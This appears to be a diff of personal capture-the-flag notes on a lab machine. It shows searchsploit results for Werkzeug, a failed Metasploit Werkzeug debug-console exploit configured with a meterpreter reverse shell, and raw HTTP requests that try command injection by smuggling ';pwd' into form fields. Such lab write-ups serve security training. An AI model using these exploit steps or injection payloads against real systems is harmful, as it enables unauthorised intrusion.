@@ -1,17 +1,173 @@
-hippoeug@kali:~$ gobuster dir -u "http://10.129.72.251:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.129.72.251:5000
-[+] Threads:        100
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/02/07 12:51:30 Starting gobuster
-===============================================================
-===============================================================
-2021/02/07 13:10:26 Finished
-===============================================================
+hippoeug@kali:~$ searchsploit werkzeug
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Werkzeug - 'Debug Shell' Command Execution                                                                                          | multiple/remote/43905.py
+Werkzeug - Debug Shell Command Execution (Metasploit)                                                                               | python/remote/37814.rb
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+
+
+msf5 > use exploit/multi/http/werkzeug_debug_rce
+[*] No payload configured, defaulting to python/meterpreter/reverse_tcp
+msf5 exploit(multi/http/werkzeug_debug_rce) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   werkzeug 0.10 and older
+
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > show options
+
+Module options (exploit/multi/http/werkzeug_debug_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /console         yes       URI to the console
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   werkzeug 0.10 and older
+
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > set rhost 10.129.72.251
+rhost => 10.129.72.251
+msf5 exploit(multi/http/werkzeug_debug_rce) > set rport 5000
+rport => 5000
+msf5 exploit(multi/http/werkzeug_debug_rce) > set lhost 10.10.14.12
+lhost => 10.10.14.12
+msf5 exploit(multi/http/werkzeug_debug_rce) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.12:4444 
+[-] Secret code not detected.
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/http/werkzeug_debug_rce) > 
+
+
+
+
+============
+
+
+
+
+POST / HTTP/1.1
+Host: 10.129.72.251:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.72.251:5000/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+ip=127.0.0.1&action=scan
+
+
+POST / HTTP/1.1
+Host: 10.129.72.251:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.72.251:5000/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+ip=127.0.0.1%3Bpwd&action=scan
+
+invalid ip
+
+
+
+POST / HTTP/1.1
+Host: 10.129.72.251:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.72.251:5000/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=werkzeug&action=searchsploit
+
+POST / HTTP/1.1
+Host: 10.129.72.251:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.72.251:5000/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=werkzeug%3Bpwd&action=searchsploit
+
+stop hacking me - well hack you back
+
+
+
+
+===========
+
+POST / HTTP/1.1
+Host: 10.129.72.251:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.72.251:5000/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=&action=pwd
+
+
+JSON web page
+action: "pwd"
+search: ""
+
+Raw Data: {"action":"pwd","search":""}
+
+
+
+============
+
+
+
+windows requires a exe ext template file
+
+
+
+
+
